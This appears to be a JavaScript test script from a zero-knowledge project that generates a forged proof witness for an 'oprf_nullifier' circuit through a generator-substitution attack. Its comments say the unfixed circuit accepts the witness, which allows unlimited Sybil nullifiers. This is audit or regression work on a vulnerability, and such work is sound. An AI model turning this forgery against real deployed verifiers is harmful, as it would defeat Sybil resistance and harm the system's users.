// F1 FORGERY witness for oprf_nullifier: generator-substitution attack.
//
// Attack (no real OPRF evaluation): pick attacker scalar k', set the substituted
// base G' = (k')^-1 * Kpub so Kpub = k'*G'. Set Y = k'*M for the cert-bound M.
// Produce an HONEST Chaum-Pedersen DLEQ over base G' (nonce t: a1=t*G', a2=t*M,
// c=pedersen([G',Kpub,M,Y,a1,a2]), z=t+c*k'). All asserts pass on the UNFIXED
// circuit, incl. the C-1 limb binding (c is the genuine transcript hash over G').
// Result N = rinv*Y = k'*H2C(id) for attacker-chosen k' => unbounded nullifiers.
//
// We reuse the honest M (and thus the honest Kpub the gate pins) from
// gen-nullifier-witness so the public-pinned M,Kpub are unchanged; only G,Y,N
// (and the DLEQ) are forged. K' != honest k => N != honest N (Sybil).

import { writeFileSync } from "node:fs";
import { Fn, N, G, hashToCurve, scalarLimbs, dleqProveBase } from "./lib.mjs";

const RNOKPP = new TextEncoder().encode("1234567890");
const det = (label) => (BigInt("0x" + Buffer.from(label).toString("hex")) % (N - 1n)) + 1n;

// Honest material (so pinned M, Kpub match the canonical gate).
const r = det("crisp-qes-test-r");
const k = det("crisp-qes-node-secret-k");
const Kpub = G.multiply(k);
const Hpt = hashToCurve(RNOKPP);
const M = Hpt.multiply(r);

// Attacker picks k' (arbitrary, != k) and the DLEQ nonce t'.
const kPrime = det("crisp-qes-ATTACKER-kprime");
const tPrime = det("crisp-qes-ATTACKER-nonce");

// G' = (k')^-1 * Kpub  => Kpub = k' * G'.
const kPrimeInv = Fn.inv(Fn.create(kPrime));
const Gprime = Kpub.multiply(kPrimeInv);
// Y = k' * M.
const Y = M.multiply(Fn.create(kPrime));

// Honest DLEQ over the SUBSTITUTED base G': a1=t'*G', a2=t'*M,
// c=pedersen([G',Kpub,M,Y,a1,a2]), z=t'+c*k' mod N.
const { c, z } = await dleqProveBase(Gprime, kPrime, Kpub, M, Y, tPrime);

// Unblind: N = rinv*Y, with r*N==Y. Pick rinv freely (F2 territory) but here we
// keep rinv = r^-1 so the group eq holds via the genuine r; N = k'*H2C(id).
const rinv = Fn.inv(Fn.create(r));
const Npt = Y.multiply(rinv);

const aff = (P) => P.toAffine();
const Gpa = aff(Gprime), Ka = aff(Kpub), Ma = aff(M), Ya = aff(Y);
const cL = scalarLimbs(c), zL = scalarLimbs(z), riL = scalarLimbs(rinv), rL = scalarLimbs(r);

const toml = `# F1 FORGERY: generator-substitution (G' = k'^-1 * Kpub). UNFIXED circuit accepts.
gx = "${Gpa.x}"
gy = "${Gpa.y}"
kpx = "${Ka.x}"
kpy = "${Ka.y}"
mx = "${Ma.x}"
my = "${Ma.y}"
yx = "${Ya.x}"
yy = "${Ya.y}"
c_lo = "${cL.lo}"
c_hi = "${cL.hi}"
z_lo = "${zL.lo}"
z_hi = "${zL.hi}"
rinv_lo = "${riL.lo}"
rinv_hi = "${riL.hi}"
r_lo = "${rL.lo}"
r_hi = "${rL.hi}"
c_expected = "${c}"
`;

writeFileSync(new URL("./circuits/oprf_nullifier/Prover.toml", import.meta.url), toml);
console.log("wrote F1 FORGERY Prover.toml");
const Naff = aff(Npt);
console.log("forged G'.x =", Gpa.x.toString());
console.log("forged N    =", Naff.x.toString(), Naff.y.toString());
